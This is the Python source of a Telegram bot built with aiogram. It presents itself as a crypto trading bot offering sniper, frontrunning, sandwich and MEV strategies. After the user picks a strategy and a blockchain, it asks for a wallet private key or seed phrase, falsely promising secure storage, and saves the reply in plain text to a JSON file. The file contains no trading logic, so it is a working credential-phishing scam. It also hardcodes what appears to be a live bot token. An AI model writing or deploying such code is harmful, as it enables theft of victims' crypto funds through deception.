import asyncio
import logging
import json
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.storage.memory import MemoryStorage

# Replace with your bot token
TOKEN = "7140174929:AAFvqSHq-vzxL-UWT4yREeruGkwQocj6YmY"

# Initialize bot and dispatcher with MemoryStorage for FSM
bot = Bot(token=TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# Setup logging
logging.basicConfig(level=logging.INFO)

# JSON file to store user credentials
CREDENTIALS_FILE = "user_credentials.json"

def save_credentials(user_id, username, key_type, key_value):
    try:
        with open(CREDENTIALS_FILE, "r") as file:
            data = json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        data = {}
    
    data[str(user_id)] = {"username": username, key_type: key_value}
    
    with open(CREDENTIALS_FILE, "w") as file:
        json.dump(data, file, indent=4)

# Define an FSM state for collecting the key input
class KeyInput(StatesGroup):
    waiting_for_key = State()

# Define the strategy selection keyboard using keyword arguments for KeyboardButton
strategy_keyboard = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="Sniper"), KeyboardButton(text="Frontrunning")],
        [KeyboardButton(text="Sandwich"), KeyboardButton(text="Mev")],
        [KeyboardButton(text="Pump fun")]
    ],
    resize_keyboard=True
)

@dp.message(Command("start"))
async def send_welcome(message: types.Message):
    start_button = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="Start 🚀")]],
        resize_keyboard=True
    )
    await message.answer(
        "🚀 Welcome to the BI Bot! 🌐\n\n"
        "Maximize your profits with BI (Bot Installation).\n"
        "This bot helps monitor blockchain activity, automate strategies, and optimize trading.\n\n"
        "Commands:\n"
        "• /start: Begin your BI journey and set up the bot.\n"
        "• /quit: Disconnect and stop the bot.\n\n"
        "Secure, efficient, and user-friendly—let’s start extracting value! 🚀",
        reply_markup=start_button
    )

@dp.message(lambda message: message.text == "Start 🚀")
async def choose_strategy(message: types.Message):
    await message.answer("Please choose a strategy:", reply_markup=strategy_keyboard)

@dp.message(Command("quit"))
async def quit_bot(message: types.Message):
    await message.answer("Bot has been stopped. Type /start to restart.")

@dp.message(lambda message: message.text in ["Sniper", "Frontrunning", "Sandwich", "Mev", "Pump fun"])
async def strategy_selected(message: types.Message):
    blockchain_keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Ethereum"), KeyboardButton(text="Solana")],
            [KeyboardButton(text="Base Blockchain"), KeyboardButton(text="Binance")],
            [KeyboardButton(text="Back")]
        ],
        resize_keyboard=True
    )
    await message.answer(
        f"You selected {message.text} strategy! 🚀\nPlease select a blockchain:",
        reply_markup=blockchain_keyboard
    )

@dp.message(lambda message: message.text in ["Ethereum", "Solana", "Base Blockchain", "Binance"])
async def blockchain_selected(message: types.Message):
    security_keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Use Private Key"), KeyboardButton(text="Use Seed Phrase")]
        ],
        resize_keyboard=True
    )
    await message.answer(
        f"You selected {message.text} blockchain.\n\n"
        "To ensure the highest level of security and personalization for your trading bot, "
        "please provide either your private key or seed phrase. "
        "Don't worry—this information is stored securely and is used only to customize your wallet settings. "
        "Please select an option below:",
        reply_markup=security_keyboard
    )

@dp.message(lambda message: message.text in ["Use Private Key", "Use Seed Phrase"])
async def request_key(message: types.Message, state: FSMContext):
    key_type = "private_key" if message.text == "Use Private Key" else "seed_phrase"
    await state.update_data(key_type=key_type)
    await message.answer(f"Please enter your {key_type.replace('_', ' ')}.")
    await state.set_state(KeyInput.waiting_for_key)

@dp.message(KeyInput.waiting_for_key)
async def store_key(message: types.Message, state: FSMContext):
    data = await state.get_data()
    key_type = data.get("key_type")
    save_credentials(message.from_user.id, message.from_user.username, key_type, message.text)
    await message.answer("Your key has been securely saved!")
    await state.clear()

async def main():
    # Start polling updates from Telegram
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
